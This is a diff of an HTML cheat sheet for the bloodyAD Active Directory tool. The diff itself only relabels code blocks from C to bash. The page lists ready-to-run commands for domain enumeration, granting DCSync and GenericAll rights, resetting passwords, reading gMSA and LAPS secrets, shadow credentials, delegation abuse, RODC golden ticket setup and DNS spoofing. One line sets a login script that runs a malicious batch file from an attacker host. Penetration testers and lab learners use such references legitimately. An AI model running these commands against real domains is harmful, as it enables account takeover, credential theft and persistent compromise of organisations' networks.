@@ -183,24 +183,24 @@
 <li><strong>Windows</strong> -&gt; https://github.com/CravateRouge/bloodyAD/releases.</li>
 <li><strong>Linux</strong> -&gt; install via <code>pipx</code>.</li>
 </ul>
-<pre><code class="language-c">pipx install git+https://github.com/CravateRouge/bloodyAD
+<pre><code class="language-bash">pipx install git+https://github.com/CravateRouge/bloodyAD
 </code></pre>
 <hr />
 <h2 id="authentication">Authentication</h2>
 <ul>
 <li>User/Password</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' ...&lt;SNIP&gt;....
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' ...&lt;SNIP&gt;....
 </code></pre>
 <ul>
 <li>Pass-the-Hash (PtH)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p ':e656e07c56d831611b577b160b259ad2' ...&lt;SNIP&gt;....
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p ':e656e07c56d831611b577b160b259ad2' ...&lt;SNIP&gt;....
 </code></pre>
 <ul>
 <li>Kerberos (FQDN required -&gt; example: DC01.lab.local)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $FQDN -d lab.local -k ...&lt;SNIP&gt;....
+<pre><code class="language-bash">bloodyAD --host $FQDN -d lab.local -k ...&lt;SNIP&gt;....
 </code></pre>
 <hr />
 <h2 id="enumeration">Enumeration</h2>
@@ -208,90 +208,90 @@
 <ul>
 <li>Enumerate object attributes where we have WRITABLE access (very useful for checking permissions that don’t appear in BloodHound)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get writable --detail
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get writable --detail
 </code></pre>
 <ul>
 <li>Get all securityDescriptors of an object (very useful to manually enumerate the entire DACL list of an object searching for permissions that don’t appear in BloodHound)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr ntsecuritydescriptor --resolve-sd
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr ntsecuritydescriptor --resolve-sd
 </code></pre>
 <p><strong><em>Domain Enumeration</em></strong></p>
 <ul>
 <li>Get all available information for a user</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER'
 </code></pre>
 <ul>
 <li>Get all critical information for a user</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER' --attr name,distinguishedName,objectSid,description,memberOf,userAccountControl,adminCount
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER' --attr name,distinguishedName,objectSid,description,memberOf,userAccountControl,adminCount
 </code></pre>
 <ul>
 <li>Get group membership for a user/group/computer</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr memberOf
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr memberOf
 </code></pre>
 <ul>
 <li>Get a list of all members of a group</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get membership 'TARGET_GROUP'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get membership 'TARGET_GROUP'
 </code></pre>
 <ul>
 <li>Get a list of all users (only retrieves the distinguishedName)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype useronly
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype useronly
 </code></pre>
 <ul>
 <li>Get a list of all groups (only retrieves the distinguishedName)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype group
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype group
 </code></pre>
 <ul>
 <li>Get a list of all computers (only retrieves the distinguishedName)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype computer
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype computer
 </code></pre>
 <ul>
 <li>Get a list of all Organizational Units (OUs) (only retrieves the distinguishedName)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype container
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype container
 </code></pre>
 <ul>
 <li>Get a list of all Trusts</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype trustedDomain
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype trustedDomain
 </code></pre>
 <ul>
 <li>Get a list of all accounts with an SPN (servicePrincipalName) assigned {Kerberoastable users}</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
 </code></pre>
 <ul>
 <li>Get a list of all accounts with the <code>DONT_REQ_PREAUTH</code> flag {AS-REP Roastable users}</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 </code></pre>
 <ul>
 <li>Get the total available <strong><em>Machine Quota</em></strong></li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota
 </code></pre>
 <ul>
 <li>Get the AD Forest level</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr msDS-Behavior-Version
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr msDS-Behavior-Version
 </code></pre>
 <ul>
 <li>Get the domain minimum password length</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr minPwdLength
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr minPwdLength
 </code></pre>
 <hr />
 <h2 id="acl-object-attacks">ACL &amp; Object Attacks</h2>
 <ul>
 <li>Add a user to a group</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add groupMember 'GROUP_NAME' 'MEMBER_TO_ADD'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add groupMember 'GROUP_NAME' 'MEMBER_TO_ADD'
 </code></pre>
 <ul>
 <li>
@@ -302,62 +302,62 @@
 </blockquote>
 </li>
 </ul>
-<pre><code class="language-c">bloodyAD --host DC2.moneycorp.corp -d lab.local -u 'gzzcoo' -p 'password' add groupMember 'CN=TARGET GROUP,CN=USERS,DC=MONEYCORP,DC=CORP' 'S-1-5-21-854245398-3134732156-1229272821-4521'
+<pre><code class="language-bash">bloodyAD --host DC2.moneycorp.corp -d lab.local -u 'gzzcoo' -p 'password' add groupMember 'CN=TARGET GROUP,CN=USERS,DC=MONEYCORP,DC=CORP' 'S-1-5-21-854245398-3134732156-1229272821-4521'
 </code></pre>
 <ul>
 <li>Remove a user from a group</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' delete groupMember 'GROUP_NAME' 'MEMBER_TO_DELETE'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' delete groupMember 'GROUP_NAME' 'MEMBER_TO_DELETE'
 </code></pre>
 <ul>
 <li>Make a user the owner of an object (Usually via the <code>WriteOwner</code> ACL)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set owner 'TARGET_OBJECT' 'TARGET_USER'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set owner 'TARGET_OBJECT' 'TARGET_USER'
 </code></pre>
 <ul>
 <li>Add ‘GenericAll’ (Full Control) permissions to an object</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add genericAll 'DN_TARGET' 'TARGET_USER'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add genericAll 'DN_TARGET' 'TARGET_USER'
 </code></pre>
 <ul>
 <li>Enable a disabled account</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' remove uac 'TARGET_USER' -f ACCOUNTDISABLE
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' remove uac 'TARGET_USER' -f ACCOUNTDISABLE
 </code></pre>
 <ul>
 <li>Add DCSync permissions to an object</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dcsync 'OBJECT_TARGET'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dcsync 'OBJECT_TARGET'
 </code></pre>
 <ul>
 <li>Add a malicious script to a user that executes upon login (scriptPath)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' scriptpath -v '\\&lt;ATTACKER_IP&gt;\malicious.bat'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' scriptpath -v '\\&lt;ATTACKER_IP&gt;\malicious.bat'
 </code></pre>
 <ul>
 <li>Modify the UPN (userPrincipalName) for ADCS/UPN Spoofing attacks</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' userPrincipalName -v 'impersonateUser@lab.local'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' userPrincipalName -v 'impersonateUser@lab.local'
 </code></pre>
 <ul>
 <li>Modify a user’s mail attribute</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' mail -v 'pwned@lab.local'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' mail -v 'pwned@lab.local'
 </code></pre>
 <ul>
 <li>Assign a value to the altSecurityIdentities attribute for X.509/ESC14b attacks</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' altSecurityIdentities -v 'X509:&lt;I&gt;&lt;....SNIP.....&gt;'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' altSecurityIdentities -v 'X509:&lt;I&gt;&lt;....SNIP.....&gt;'
 </code></pre>
 <ul>
 <li>Create a new computer account</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add computer 'COMPUTER_NAME' 'COMPUTER_PASSWORD'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add computer 'COMPUTER_NAME' 'COMPUTER_PASSWORD'
 </code></pre>
 <ul>
 <li>Abuse <code>CREATE_CHILD</code> on an OU in Windows Server 2025 - dMSA (BadSuccessor)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add badSuccessor attacker_dMSA
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add badSuccessor attacker_dMSA
 </code></pre>
 <ul>
 <li>
@@ -369,10 +369,10 @@
 </li>
 </ul>
 <p>Change to Security Universal Group (<code>-2147483640</code>):</p>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483640
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483640
 </code></pre>
 <p>Change to Domain Local Security Group (<code>-2147483644</code>):</p>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483644
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483644
 </code></pre>
 <hr />
 <h2 id="rodc-attacks-rodc-golden-ticket">RODC Attacks (RODC Golden Ticket)</h2>
@@ -382,66 +382,66 @@
 <li>Get original <code>msDS-RevealOnDemandGroup</code> values of the RODC object</li>
 </ul>
 </blockquote>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'RODC01$' --attr msDS-RevealOnDemandGroup
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'RODC01$' --attr msDS-RevealOnDemandGroup
 </code></pre>
 <ul>
 <li>Add the target high-privileged user (e.g., Administrator) to the allowed replication group alongside the original values obtained previously</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=lab,DC=local' -v 'CN=Administrator,CN=Users,DC=lab,DC=local'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=lab,DC=local' -v 'CN=Administrator,CN=Users,DC=lab,DC=local'
 </code></pre>
 <ul>
 <li>Clear or modify the <code>msDS-NeverRevealGroup</code> attribute to ensure the target admin is not prevented from replicating</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-NeverRevealGroup
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-NeverRevealGroup
 </code></pre>
 <hr />
 <h2 id="password-attacks">Password Attacks</h2>
 <ul>
 <li>Modify a user’s password</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set password 'TARGET_USER' 'Gzzcoo123'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set password 'TARGET_USER' 'Gzzcoo123'
 </code></pre>
 <ul>
 <li>Read a computer’s gMSA password</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_gMSA' --attr msDS-ManagedPassword
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_gMSA' --attr msDS-ManagedPassword
 </code></pre>
 <ul>
 <li>Read a computer’s LAPS password</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 </code></pre>
 <hr />
 <h2 id="kerberos-attacks">Kerberos Attacks</h2>
 <ul>
 <li>Enable <code>DONT_REQ_PREAUTH</code> to make a user AS-REP Roastable</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET_USER' -f DONT_REQ_PREAUTH
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET_USER' -f DONT_REQ_PREAUTH
 </code></pre>
 <ul>
 <li>Shadow Credentials Attack (requires PKINIT afterwards)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add shadowCredentials 'TARGET'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add shadowCredentials 'TARGET'
 </code></pre>
 <ul>
 <li>Add the <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> flag - Unconstrained Delegation</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION
 </code></pre>
 <ul>
 <li>Add the <code>DELEGATE_TO</code> flag - Resource-based Constrained Delegation</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add rbcd 'DELEGATE_TO' 'DELEGATE_FROM'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add rbcd 'DELEGATE_TO' 'DELEGATE_FROM'
 </code></pre>
 <ul>
 <li>Assign an SPN to a user to make them Kerberoastable</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName -v 'cifs/gzzcoo'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName -v 'cifs/gzzcoo'
 </code></pre>
 <ul>
 <li>Remove the previously added SPN</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName
 </code></pre>
 <hr />
 <h2 id="dns-attacks">DNS Attacks</h2>
@@ -449,12 +449,12 @@
 <li>Check if we have permission to add DNS records; we can observe this using <code>get writable --detail</code>.</li>
 <li>Query the system DNS records</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get dnsDump &gt; dnsdump.txt
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get dnsDump &gt; dnsdump.txt
 </code></pre>
 <ul>
 <li>Create a new DNS record to perform DNS Spoofing attacks</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dnsRecord 'DNS_RECORD_TARGET' 'ATTACKER_IP'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dnsRecord 'DNS_RECORD_TARGET' 'ATTACKER_IP'
 </code></pre>
 <hr />
 <h2 id="restore-ad-objects">Restore AD Objects</h2>
@@ -464,17 +464,17 @@
 <li>Check if we have permissions to restore deleted objects (can also be seen with <code>get writable --detail</code> if we have ACLs over other users).</li>
 </ul>
 </blockquote>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ntsecuritydescriptor --resolve-sd | grep -B3 'Reanimate-Tombstones'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ntsecuritydescriptor --resolve-sd | grep -B3 'Reanimate-Tombstones'
 </code></pre>
 <ul>
 <li>Check for deleted users in AD</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' --attr name,objectSid,objectGuid,description
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' --attr name,objectSid,objectGuid,description
 </code></pre>
 <ul>
 <li>Restore a deleted user in AD (you can use the GUID, SID, DN, or sAMAccountName)</li>
 </ul>
-<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set restore 'S-1-5-21-3927696377-1337352550-2781715495-1110'
+<pre><code class="language-bash">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set restore 'S-1-5-21-3927696377-1337352550-2781715495-1110'
 </code></pre>
 <hr />
 <h2 id="references-useful-pages">References / Useful Pages</h2>
